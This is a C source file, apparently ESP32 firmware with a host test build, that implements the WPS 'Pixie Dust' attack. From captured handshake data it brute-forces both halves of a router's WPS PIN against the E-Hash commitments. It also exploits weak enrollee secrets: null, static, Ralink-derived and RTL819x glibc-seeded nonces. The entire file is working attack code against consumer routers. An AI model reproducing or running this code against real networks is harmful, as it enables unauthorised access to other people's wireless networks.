#include "pixie.h"
#include "pixie_prng.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef WPS_HOST_TEST
typedef struct evp_md_st EVP_MD;
const EVP_MD *EVP_sha256(void);
unsigned char *HMAC(const EVP_MD *, const void *, int, const unsigned char *, size_t,
                    unsigned char *, unsigned int *);
#else
#include "esp_heap_caps.h"
#include "psa/crypto.h"
#endif

#define HALF_COUNT 10000u
#define RTL_ES1_SPAN 600u
#define RTL_ES2_SPAN 10u
#define RTL_WINDOW_SECONDS 86400u

typedef struct {
    const pixie_bundle_t *bundle;
    const pixie_options_t *options;
    pixie_result_t *result;
    uint8_t (*psks)[16];
    size_t psk_count;
    uint8_t empty_psk[16];
    bool failed;
} oracle_t;

static void scrub(void *data, size_t len);

static void *cache_alloc(const pixie_options_t *options, size_t size) {
    if (options->cache_alloc) return options->cache_alloc(options->cache_context, size);
#ifdef WPS_HOST_TEST
    return malloc(size);
#else
    return heap_caps_malloc(size, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
#endif
}

static void cache_free(const pixie_options_t *options, void *memory, size_t size) {
    if (!memory) return;
    /* Keep allocator callbacks simple and make every exit path, including an
     * early crypto failure after allocation, release only a scrubbed cache. */
    scrub(memory, size);
    if (options->cache_free) {
        options->cache_free(options->cache_context, memory, size);
        return;
    }
#ifdef WPS_HOST_TEST
    free(memory);
#else
    heap_caps_free(memory);
#endif
}

static void scrub(void *data, size_t len) {
    volatile uint8_t *p = data;
    while (len--) *p++ = 0;
}

static bool hmac256(const uint8_t *key, size_t key_len, const uint8_t *data,
                    size_t len, uint8_t out[32]) {
#ifdef WPS_HOST_TEST
    unsigned out_len = 0;
    return HMAC(EVP_sha256(), key, (int)key_len, data, len, out, &out_len) != NULL &&
           out_len == 32;
#else
    psa_key_attributes_t attr = PSA_KEY_ATTRIBUTES_INIT;
    psa_key_id_t id = 0;
    size_t out_len = 0;
    psa_set_key_type(&attr, PSA_KEY_TYPE_HMAC);
    psa_set_key_usage_flags(&attr, PSA_KEY_USAGE_SIGN_MESSAGE);
    psa_set_key_algorithm(&attr, PSA_ALG_HMAC(PSA_ALG_SHA_256));
    bool ok = psa_import_key(&attr, key, key_len, &id) == PSA_SUCCESS;
    psa_reset_key_attributes(&attr);
    if (ok) ok = psa_mac_compute(id, PSA_ALG_HMAC(PSA_ALG_SHA_256), data, len,
                                 out, 32, &out_len) == PSA_SUCCESS && out_len == 32;
    if (id && psa_destroy_key(id) != PSA_SUCCESS) ok = false;
    return ok;
#endif
}

static bool tick(oracle_t *oracle) {
    ++oracle->result->commitment_checks;
    uint32_t interval = oracle->options->yield_every ? oracle->options->yield_every : 256u;
    if (oracle->result->commitment_checks % interval) return true;
    if (oracle->options->yield) oracle->options->yield(oracle->options->callback_context);
    if (oracle->options->should_cancel &&
        oracle->options->should_cancel(oracle->options->callback_context)) {
        oracle->result->cancelled = true;
        return false;
    }
    return true;
}

static bool make_psk(oracle_t *oracle, const uint8_t *password, size_t len,
                     uint8_t out[16]) {
    uint8_t digest[32];
    bool ok = hmac256(oracle->bundle->authkey, 32, password, len, digest);
    if (ok) memcpy(out, digest, 16);
    scrub(digest, sizeof(digest));
    if (!ok) oracle->failed = true;
    return ok;
}

static const uint8_t *psk_for(oracle_t *oracle, unsigned value) {
    while (oracle->psk_count <= value) {
        char digits[5];
        int n = snprintf(digits, sizeof(digits), "%04u", (unsigned)oracle->psk_count);
        if (n != 4 || !make_psk(oracle, (const uint8_t *)digits, 4,
                                oracle->psks[oracle->psk_count])) return NULL;
        ++oracle->psk_count;
    }
    return oracle->psks[value];
}

static bool matches(oracle_t *oracle, const uint8_t secret[16], const uint8_t psk[16],
                    const uint8_t expected[32]) {
    uint8_t input[416], digest[32];
    memcpy(input, secret, 16);
    memcpy(input + 16, psk, 16);
    memcpy(input + 32, oracle->bundle->pke, 192);
    memcpy(input + 224, oracle->bundle->pkr, 192);
    bool ok = hmac256(oracle->bundle->authkey, 32, input, sizeof(input), digest);
    bool equal = ok && memcmp(digest, expected, 32) == 0;
    scrub(input, sizeof(input));
    scrub(digest, sizeof(digest));
    if (!ok) oracle->failed = true;
    if (!tick(oracle)) return false;
    return equal;
}

static bool find_half(oracle_t *oracle, const uint8_t secret[16],
                      const uint8_t expected[32], char out[5]) {
    if (matches(oracle, secret, oracle->empty_psk, expected)) {
        out[0] = '\0';
        return true;
    }
    for (unsigned value = 0; value < HALF_COUNT && !oracle->failed &&
                             !oracle->result->cancelled; ++value) {
        const uint8_t *psk = psk_for(oracle, value);
        if (!psk) break;
        if (matches(oracle, secret, psk, expected)) {
            snprintf(out, 5, "%04u", value);
            return true;
        }
    }
    return false;
}

static bool recover_pair(oracle_t *oracle, const uint8_t e_s1[16],
                         const uint8_t e_s2[16], char pin[9]) {
    char first[5], second[5];
    if (!find_half(oracle, e_s1, oracle->bundle->e_hash1, first)) return false;
    if (!find_half(oracle, e_s2, oracle->bundle->e_hash2, second)) return false;
    int n = snprintf(pin, 9, "%s%s", first, second);
    return n >= 0 && n <= 8;
}

static bool recover_rtl(oracle_t *oracle) {
    const uint8_t *nonce = oracle->bundle->e_nonce;
    if ((nonce[0] | nonce[4] | nonce[8] | nonce[12]) & 0x80) return false;
    uint32_t start, end;
    if (oracle->options->rtl_window_set) {
        start = oracle->options->rtl_window_start;
        end = oracle->options->rtl_window_end;
    } else {
        uint32_t now = (uint32_t)time(NULL);
        start = now + RTL_WINDOW_SECONDS;
        end = now - RTL_WINDOW_SECONDS;
    }
    uint32_t high = start > end ? start : end;
    uint32_t low = start > end ? end : start;
    if (high - low > RTL_WINDOW_SECONDS * 2u) {
        oracle->failed = true;
        return false;
    }
    uint32_t nonce_seed;
    if (!pixie_find_glibc_nonce_seed(nonce, start, end, &nonce_seed)) return false;

    char first[5] = {0};
    uint32_t s1_seed = nonce_seed;
    bool first_found = false;
    uint8_t secret[16];
    for (uint32_t dist = 0; dist <= RTL_ES1_SPAN && !first_found &&
                            !oracle->failed && !oracle->result->cancelled; ++dist) {
        uint32_t candidates[2] = {nonce_seed + dist, nonce_seed - dist};
        unsigned count = dist == 0 ? 1 : 2;
        for (unsigned i = 0; i < count; ++i) {
            pixie_glibc_nonce(candidates[i], secret);
            if (find_half(oracle, secret, oracle->bundle->e_hash1, first)) {
                s1_seed = candidates[i];
                first_found = true;
                break;
            }
        }
    }
    if (!first_found) return false;

    for (uint32_t offset = 0; offset < RTL_ES2_SPAN && !oracle->failed &&
                              !oracle->result->cancelled; ++offset) {
        char second[5];
        pixie_glibc_nonce(s1_seed + offset, secret);
        if (find_half(oracle, secret, oracle->bundle->e_hash2, second)) {
            snprintf(oracle->result->pin, sizeof(oracle->result->pin), "%s%s", first, second);
            oracle->result->found = true;
            return true;
        }
    }
    if (!oracle->failed && !oracle->result->cancelled) {
        memcpy(oracle->result->first_half, first, sizeof(first));
        oracle->result->partial = true;
        oracle->result->mode = PIXIE_MODE_RTL819X;
    }
    return false;
}

static bool try_pair(oracle_t *oracle, pixie_mode_t mode,
                     const uint8_t e_s1[16], const uint8_t e_s2[16]) {
    if (!recover_pair(oracle, e_s1, e_s2, oracle->result->pin)) return false;
    oracle->result->found = true;
    oracle->result->mode = mode;
    return true;
}

bool pixie_recover(const pixie_bundle_t *bundle, const pixie_options_t *options,
                   pixie_result_t *result) {
    if (!bundle || !options || !result ||
        (options->static_secret_count && !options->static_secrets) ||
        ((options->cache_alloc == NULL) != (options->cache_free == NULL)))
        return false;
    memset(result, 0, sizeof(*result));
#ifndef WPS_HOST_TEST
    if (psa_crypto_init() != PSA_SUCCESS) return false;
#endif
    oracle_t oracle = {.bundle = bundle, .options = options, .result = result};
    const size_t cache_size = HALF_COUNT * sizeof(*oracle.psks);
    oracle.psks = cache_alloc(options, cache_size);
    static const uint8_t empty = 0;
    if (!oracle.psks || !make_psk(&oracle, &empty, 0, oracle.empty_psk)) {
        cache_free(options, oracle.psks, cache_size);
        return false;
    }
    uint32_t modes = options->modes ? options->modes : PIXIE_MODE_DEFAULT;
    static const uint8_t zero[16] = {0};
    bool done = false;

    if ((modes & PIXIE_MODE_NULL_SECRET) &&
        try_pair(&oracle, PIXIE_MODE_NULL_SECRET, zero, zero)) done = true;

    if (!done && !oracle.failed && !result->cancelled && (modes & PIXIE_MODE_STATIC_SECRET)) {
        if (options->static_secret_count) {
            for (size_t i = 0; i < options->static_secret_count && !done &&
                               !oracle.failed && !result->cancelled; ++i) {
                done = try_pair(&oracle, PIXIE_MODE_STATIC_SECRET,
                                options->static_secrets[i].e_s1,
                                options->static_secrets[i].e_s2);
            }
        } else {
            done = try_pair(&oracle, PIXIE_MODE_STATIC_SECRET,
                            bundle->e_nonce, bundle->e_nonce);
        }
    }

    if (!done && !oracle.failed && !result->cancelled && (modes & PIXIE_MODE_RALINK)) {
        uint8_t e_s1[16], e_s2[16];
        if (pixie_ralink_recover(bundle->e_nonce, e_s1, e_s2))
            done = try_pair(&oracle, PIXIE_MODE_RALINK, e_s1, e_s2);
        scrub(e_s1, sizeof(e_s1));
        scrub(e_s2, sizeof(e_s2));
    }

    if (!done && !oracle.failed && !result->cancelled && (modes & PIXIE_MODE_RTL819X)) {
        result->mode = PIXIE_MODE_RTL819X;
        done = recover_rtl(&oracle);
        if (!done && !result->partial) result->mode = PIXIE_MODE_NONE;
        else if (done) result->mode = PIXIE_MODE_RTL819X;
    }

    scrub(oracle.empty_psk, sizeof(oracle.empty_psk));
    scrub(oracle.psks, HALF_COUNT * sizeof(*oracle.psks));
    cache_free(options, oracle.psks, cache_size);
    return !oracle.failed;
}
